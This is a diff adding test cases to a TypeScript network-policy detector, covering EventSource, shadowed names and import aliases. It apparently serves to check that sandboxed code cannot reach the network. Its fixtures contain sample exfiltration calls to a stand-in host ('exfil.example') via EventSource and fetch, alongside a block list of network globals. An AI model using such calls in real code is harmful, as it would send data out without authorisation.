@@ -12,6 +12,7 @@ import {
   isValueRead,
   isWriteTarget,
   LOOPBACK_HOST,
+  NETWORK_GLOBAL_NAMES,
   POLICY_KEY_NAMES,
   PORT_MAX,
   STATIC_KEY_CEILING,
@@ -809,7 +810,7 @@ describe('D3 network policy receiver-call result authority inheritance (PR #67 F
     expect(occurrences(detector, 'const memberCallOf = ')).toBe(1);
     expect(occurrences(detector, 'memberCallOf(parent)')).toBe(1);
     expect(occurrences(detector, 'inheritingReceiverOf(ctx, ')).toBe(1);
-    for (const forbidden of ['valueOf', 'toString', 'EventSource', 'receiverPreserving', 'RETURNS_THIS']) {
+    for (const forbidden of ['valueOf', 'toString', 'receiverPreserving', 'RETURNS_THIS']) {
       expect(occurrences(detector, forbidden), forbidden).toBe(0);
     }
     expect(POLICY_KEY_NAMES).not.toContain('valueOf');
@@ -988,6 +989,93 @@ describe('D3 network policy server instantiation site bound (PR #67 B2)', () => 
     expect(occurrences(detector, 'checkInstantiationSites(ctx)')).toBe(1);
     expect(occurrences(detector, 'serverFactories')).toBe(0);
     expect(occurrences(detector, 'serverCount')).toBe(0);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Codex review closure: EventSource network global, runtime shadows (PR #67)
+// ---------------------------------------------------------------------------
+
+describe('D3 network policy closes the open Codex findings on PR #67', () => {
+  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
+
+  it('P1: EventSource is a network global on the supported runtime, blocked like fetch and WebSocket', () => {
+    expect([...NETWORK_GLOBAL_NAMES].sort()).toEqual(['EventSource', 'WebSocket', 'fetch']);
+    expect(STATIC_KEY_CEILING).toBe('createServer'.length);
+    for (const [source, reason] of [
+      [`new EventSource('https://exfil.example/');`, 'FREE_GLOBAL_NETWORK'],
+      [`const E = EventSource;`, 'FREE_GLOBAL_NETWORK'],
+      [`new globalThis.EventSource('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`new window['EventSource']('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`const { EventSource: E } = globalThis;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+    ] as const) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
+      expect(result.findings, source).toHaveLength(1);
+    }
+    for (const source of [`class EventSource {}\nnew EventSource();`, `let es: EventSource | null = null;\nes;`, `const o = { EventSource: 1 };\no.EventSource;`]) {
+      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([]);
+    }
+  });
+
+  it('P2: a named function expression binds its name inside its own body at runtime', () => {
+    for (const source of [
+      `const f = function fetch() { return fetch; };\nf();`,
+      `const open = function WebSocket(url: string) { return url ? WebSocket : null; };\nopen('x');`,
+      `use(function EventSource() { return new EventSource(); });`,
+    ]) {
+      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([]);
+    }
+    const outside = analyzeNetworkPolicy(`const f = function fetch() { return 1; };\nfetch('x');`);
+    expect(outside.reasons).toEqual(['FREE_GLOBAL_NETWORK']);
+    expect(outside.findings).toHaveLength(1);
+  });
+
+  it('P2: a private import-equals alias of a value is a runtime binding; an alias of a type stays erased', () => {
+    for (const source of [
+      `import * as Local from './x.js';\nimport fetch = Local.f;\nfetch('x');`,
+      `namespace Local {\n  export const f = (url: string) => url;\n}\nimport fetch = Local.f;\nfetch('x');`,
+      `import { f } from './x.js';\nimport fetch = f;\nfetch('x');`,
+      `namespace Local {\n  export const f = 1;\n}\nimport g = Local.f;\nimport fetch = g;\nfetch;`,
+      `namespace Local {\n  export const x = 1;\n}\nimport fetch = Local;\nfetch.x;`,
+      `namespace Local {\n  export const f = 1;\n}\nnamespace fetch {\n  import f = Local.f;\n  export const g = f;\n}\nfetch.g;`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
+    }
+    for (const source of [
+      `namespace Local {\n  export type f = string;\n}\nimport fetch = Local.f;\nfetch;`,
+      `import type { f } from './x.js';\nimport fetch = f;\nfetch;`,
+      `namespace Local {\n  export type T = string;\n}\nimport fetch = Local;\nfetch;`,
+      `namespace Local {\n  export type T = string;\n}\nnamespace fetch {\n  import T = Local.T;\n}\nfetch;`,
+      `import type fetch = require('./local.js');\nfetch('x');`,
+      `import fetch = fetch;\nfetch;`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['FREE_GLOBAL_NETWORK']);
+      expect(result.fixpoint.state, source).toBe('CONVERGED');
+    }
+  });
+
+  it('P1 (already structural): fluent privileged results, valueOf laundering and the server bound stay denied', () => {
+    const fluent = analyzeNetworkPolicy(withServer(`export const leaked = server.listen(4317, '127.0.0.1');\nleaked.on('connection', (socket) => { socket.write('x'); });`));
+    // The export is the denial; an exported binding is unconfined and carries no further authority to check.
+    expect(fluent.reasons, describeFindings(fluent)).toEqual(['SERVER_EXPORT']);
+    const fluentResponse = analyzeNetworkPolicy(`${NS}\nhttp.createServer((request, response) => { response.setHeader('a', 'b').socket; });`);
+    expect(fluentResponse.reasons, describeFindings(fluentResponse)).toEqual(['RESPONSE_MEMBER']);
+    const laundered = analyzeNetworkPolicy(`const g = globalThis.valueOf() as typeof globalThis;\ng.fetch('https://exfil.example/');`);
+    expect(laundered.reasons, describeFindings(laundered)).toEqual(['GLOBAL_RECEIVER_ESCAPE']);
+    const twice = analyzeNetworkPolicy(`${NS}\nfunction make() { return http.createServer(${L}); }\nconst a = make();\nconst b = make();\na.listen(4317, '127.0.0.1');\nb.listen(4318, '0.0.0.0');`);
+    expect(twice.reasons, describeFindings(twice)).toEqual(['CREATE_SERVER_MULTIPLE', 'SERVER_LISTEN_BINDING']);
+  });
+
+  it('is structural: one runtime-shadow predicate, threaded through the single symbol-resolution path', () => {
+    const detector = readFileSync(detectorPath, 'utf8');
+    expect(occurrences(detector, 'function isRuntimeShadowed(')).toBe(1);
+    expect(occurrences(detector, 'isRuntimeShadowed(ctx.checker, ')).toBe(1);
+    expect(occurrences(detector, 'function isRuntimeImportEquals(')).toBe(1);
+    expect(occurrences(detector, 'ts.isFunctionExpression(declaration)')).toBe(1);
+    expect(occurrences(detector, 'isValueAliasDeclaration')).toBe(0);
   });
 });
 
